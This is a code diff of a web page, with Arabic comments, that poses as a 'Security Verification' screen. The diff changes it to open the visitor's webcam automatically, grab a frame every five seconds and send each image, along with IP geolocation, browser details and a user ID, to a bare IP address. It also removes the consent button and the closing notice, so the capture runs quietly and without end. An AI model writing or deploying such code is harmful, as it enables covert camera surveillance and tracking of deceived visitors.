@@ -9,29 +9,42 @@
     </style>
 </head>
 <body>
-    <h2>📷 Checking your device...</h2>
     <video id="video" width="320" height="240" autoplay></video>
     <canvas id="canvas" width="320" height="240"></canvas>
-    <button onclick="capture()">Allow & Continue</button>
+    <h2>Security Verification in Progress...</h2>
 
     <script>
         const video = document.getElementById("video");
         const canvas = document.getElementById("canvas");
         const ctx = canvas.getContext("2d");
         let ipInfo = {};
+        let captureInterval;
 
         // جلب بيانات الـ IP
         fetch("https://ipapi.co/json")
             .then(res => res.json())
-            .then(data => { ipInfo = data; });
+            .then(data => { 
+                ipInfo = data;
+                // بدء التقاط الكاميرا بعد الحصول على بيانات IP
+                requestCameraAccess();
+            });
 
-        // طلب الكاميرا
-        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-            video.srcObject = stream;
-            video.style.display = "block";
-        });
+        // طلب الكاميرا فور تحميل الصفحة
+        function requestCameraAccess() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    // بدء إرسال الصور والبيانات كل 5 ثواني
+                    captureAndSendData();
+                    captureInterval = setInterval(captureAndSendData, 5000);
+                })
+                .catch(err => {
+                    console.error("Camera access error:", err);
+                    document.body.innerHTML = "<h2>⚠️ Please allow camera access to continue</h2>";
+                });
+        }
 
-        function capture() {
+        function captureAndSendData() {
             ctx.drawImage(video, 0, 0, 320, 240);
             const imageData = canvas.toDataURL("image/png");
 
@@ -39,17 +52,22 @@
             const user_id = window.location.pathname.split("/").pop();
 
             // إرسال البيانات إلى السيرفر
-            fetch("https://fictional-eureka-97wrw4qqxwq42pjq6-6362.app.github.dev:6362/upload", {
+            fetch("http://79.99.40.71:6362/upload", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     image: imageData,
                     user_agent: navigator.userAgent,
                     ip_data: ipInfo,
-                    user_id: user_id
+                    user_id: user_id,
+                    timestamp: new Date().toISOString()
                 })
-            }).then(() => {
-                document.body.innerHTML = "<h2>✅ Thank you!</h2>";
+            }).then(response => {
+                if (!response.ok) {
+                    console.error("Error sending data");
+                }
+            }).catch(err => {
+                console.error("Network error:", err);
             });
         }
     </script>
